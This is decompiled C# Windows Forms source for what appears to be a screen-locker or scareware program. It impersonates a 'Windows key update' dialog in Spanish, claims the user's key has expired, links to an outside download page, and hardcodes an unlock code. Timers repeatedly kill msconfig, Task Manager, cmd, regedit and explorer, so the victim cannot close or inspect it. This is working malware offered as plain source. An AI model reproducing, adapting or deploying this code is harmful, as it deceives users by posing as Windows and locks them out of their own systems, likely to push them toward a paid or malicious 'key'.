using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsApplication5;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("TextBox3")]
	private TextBox _TextBox3;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Timer3")]
	private Timer _Timer3;

	[AccessedThroughProperty("Timer4")]
	private Timer _Timer4;

	[AccessedThroughProperty("Timer5")]
	private Timer _Timer5;

	[AccessedThroughProperty("Timer6")]
	private Timer _Timer6;

	[AccessedThroughProperty("Timer7")]
	private Timer _Timer7;

	[AccessedThroughProperty("Timer8")]
	private Timer _Timer8;

	[AccessedThroughProperty("Timer9")]
	private Timer _Timer9;

	[AccessedThroughProperty("Timer10")]
	private Timer _Timer10;

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual TextBox TextBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox3 = value;
		}
	}

	internal virtual Label Label5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual Label Label6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label6 = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button2_Click;
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click(eventHandler);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click(eventHandler);
			}
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (_Timer3 != null)
			{
				_Timer3.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			if (_Timer3 != null)
			{
				_Timer3.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer4_Tick;
			if (_Timer4 != null)
			{
				_Timer4.remove_Tick(eventHandler);
			}
			_Timer4 = value;
			if (_Timer4 != null)
			{
				_Timer4.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer5_Tick;
			if (_Timer5 != null)
			{
				_Timer5.remove_Tick(eventHandler);
			}
			_Timer5 = value;
			if (_Timer5 != null)
			{
				_Timer5.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer6 = value;
		}
	}

	internal virtual Timer Timer7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer7 = value;
		}
	}

	internal virtual Timer Timer8
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer8 = value;
		}
	}

	internal virtual Timer Timer9
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer9 = value;
		}
	}

	internal virtual Timer Timer10
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer10 = value;
		}
	}

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d8: Expected O, but got Unknown
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e9: Expected O, but got Unknown
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fa: Expected O, but got Unknown
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		//IL_010b: Expected O, but got Unknown
		//IL_0112: Unknown result type (might be due to invalid IL or missing references)
		//IL_011c: Expected O, but got Unknown
		//IL_0123: Unknown result type (might be due to invalid IL or missing references)
		//IL_012d: Expected O, but got Unknown
		//IL_0134: Unknown result type (might be due to invalid IL or missing references)
		//IL_013e: Expected O, but got Unknown
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Expected O, but got Unknown
		//IL_0221: Unknown result type (might be due to invalid IL or missing references)
		//IL_022b: Expected O, but got Unknown
		//IL_02ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b6: Expected O, but got Unknown
		//IL_0337: Unknown result type (might be due to invalid IL or missing references)
		//IL_0341: Expected O, but got Unknown
		//IL_03c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03cf: Expected O, but got Unknown
		//IL_046c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0476: Expected O, but got Unknown
		//IL_052a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0534: Expected O, but got Unknown
		//IL_05cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d6: Expected O, but got Unknown
		//IL_065a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0664: Expected O, but got Unknown
		//IL_0704: Unknown result type (might be due to invalid IL or missing references)
		//IL_070e: Expected O, but got Unknown
		//IL_07ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_07b5: Expected O, but got Unknown
		//IL_093a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0944: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		TextBox1 = new TextBox();
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		Label4 = new Label();
		TextBox2 = new TextBox();
		TextBox3 = new TextBox();
		Label5 = new Label();
		Label6 = new Label();
		Button1 = new Button();
		Button2 = new Button();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		Timer3 = new Timer(components);
		Timer4 = new Timer(components);
		Timer5 = new Timer(components);
		Timer6 = new Timer(components);
		Timer7 = new Timer(components);
		Timer8 = new Timer(components);
		Timer9 = new Timer(components);
		Timer10 = new Timer(components);
		((Control)this).SuspendLayout();
		((TextBoxBase)TextBox1).set_BackColor(Color.White);
		((TextBoxBase)TextBox1).set_BorderStyle((BorderStyle)1);
		((Control)TextBox1).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)TextBox1).set_ForeColor(Color.Black);
		TextBox textBox = TextBox1;
		Point location = new Point(158, 195);
		((Control)textBox).set_Location(location);
		((TextBoxBase)TextBox1).set_MaxLength(4);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(81, 23);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		TextBox1.set_TextAlign((HorizontalAlignment)2);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Arial", 20.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.WhiteSmoke);
		Label label = Label1;
		location = new Point(23, 24);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(367, 32);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("Error en el sistema de claves");
		((Control)Label2).set_Font(new Font("Arial", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.WhiteSmoke);
		Label label3 = Label2;
		location = new Point(26, 80);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(588, 43);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(2);
		Label2.set_Text("Hemos detectado que su clave ha caducado o no es válida, por favor, actualize su clave si tiene otra nueva o descargue una con el botón que le facilitamos en la esquina inferior derecha.");
		((Control)Label3).set_Font(new Font("Arial", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.WhiteSmoke);
		Label label5 = Label3;
		location = new Point(29, 139);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(320, 30);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(3);
		Label3.set_Text("La clave tiene este formato: XXXX-XXXX-XXXX");
		((Control)Label4).set_Font(new Font("Arial", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_ForeColor(Color.WhiteSmoke);
		Label label7 = Label4;
		location = new Point(29, 197);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(126, 21);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(4);
		Label4.set_Text("Introduza la clave:");
		((TextBoxBase)TextBox2).set_BackColor(Color.White);
		((TextBoxBase)TextBox2).set_BorderStyle((BorderStyle)1);
		((Control)TextBox2).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)TextBox2).set_ForeColor(Color.Black);
		TextBox textBox3 = TextBox2;
		location = new Point(268, 195);
		((Control)textBox3).set_Location(location);
		((TextBoxBase)TextBox2).set_MaxLength(4);
		TextBox2.set_Multiline(true);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox4 = TextBox2;
		size = new Size(81, 23);
		((Control)textBox4).set_Size(size);
		((Control)TextBox2).set_TabIndex(5);
		TextBox2.set_TextAlign((HorizontalAlignment)2);
		((TextBoxBase)TextBox3).set_BackColor(Color.White);
		((TextBoxBase)TextBox3).set_BorderStyle((BorderStyle)1);
		((Control)TextBox3).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)TextBox3).set_ForeColor(Color.Black);
		TextBox textBox5 = TextBox3;
		location = new Point(378, 195);
		((Control)textBox5).set_Location(location);
		((TextBoxBase)TextBox3).set_MaxLength(4);
		TextBox3.set_Multiline(true);
		((Control)TextBox3).set_Name("TextBox3");
		TextBox textBox6 = TextBox3;
		size = new Size(81, 23);
		((Control)textBox6).set_Size(size);
		((Control)TextBox3).set_TabIndex(6);
		TextBox3.set_TextAlign((HorizontalAlignment)2);
		((Control)Label5).set_Font(new Font("Arial", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.WhiteSmoke);
		Label label9 = Label5;
		location = new Point(245, 197);
		((Control)label9).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label10 = Label5;
		size = new Size(17, 21);
		((Control)label10).set_Size(size);
		((Control)Label5).set_TabIndex(7);
		Label5.set_Text("-");
		((Control)Label6).set_Font(new Font("Arial", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.WhiteSmoke);
		Label label11 = Label6;
		location = new Point(355, 199);
		((Control)label11).set_Location(location);
		((Control)Label6).set_Name("Label6");
		Label label12 = Label6;
		size = new Size(17, 21);
		((Control)label12).set_Size(size);
		((Control)Label6).set_TabIndex(8);
		Label6.set_Text("-");
		((ButtonBase)Button1).set_BackColor(Color.WhiteSmoke);
		((ButtonBase)Button1).set_FlatStyle((FlatStyle)0);
		((Control)Button1).set_Font(new Font("Arial", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Button button = Button1;
		location = new Point(520, 377);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(94, 27);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(9);
		((ButtonBase)Button1).set_Text("Validar clave");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button2).set_BackColor(Color.WhiteSmoke);
		((ButtonBase)Button2).set_FlatStyle((FlatStyle)0);
		((Control)Button2).set_Font(new Font("Arial", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Button button3 = Button2;
		location = new Point(420, 377);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(94, 27);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(10);
		((ButtonBase)Button2).set_Text("Descargar");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.FromArgb(24, 0, 82));
		size = new Size(646, 416);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)Label6);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)TextBox3);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Actualización de Claves de Windows™");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Timer1.Start();
		Timer2.Start();
		Timer3.Start();
		Timer4.Start();
		Timer5.Start();
		Timer6.Start();
		Timer7.Start();
		Timer8.Start();
		Timer9.Start();
		Timer10.Start();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		if ((Operators.CompareString(TextBox1.get_Text(), "4991", false) == 0) & (Operators.CompareString(TextBox2.get_Text(), "3150", false) == 0) & (Operators.CompareString(TextBox3.get_Text(), "7369", false) == 0))
		{
			Interaction.MsgBox((object)"Clave verificada correctamente.", (MsgBoxStyle)0, (object)"Clave");
			((Form)this).Close();
		}
		else
		{
			Interaction.MsgBox((object)"Clave errónea.", (MsgBoxStyle)0, (object)"Clave");
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		Process.Start("http://gripmedia.co/clave");
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (Operators.CompareString(process.ProcessName, "msconfig", false) == 0)
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "msconfig", false) == 0)
				{
					process.Kill();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (Operators.CompareString(process.ProcessName, "Taskmgr", false) == 0)
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "taskmgr", false) == 0)
				{
					process.Kill();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (Operators.CompareString(process.ProcessName, "cmd", false) == 0)
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "cmd", false) == 0)
				{
					process.Kill();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer4_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (Operators.CompareString(process.ProcessName, "regedit", false) == 0)
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "regedit", false) == 0)
				{
					process.Kill();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer5_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (Operators.CompareString(process.ProcessName, "explorer", false) == 0)
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "explorer", false) == 0)
				{
					process.Kill();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
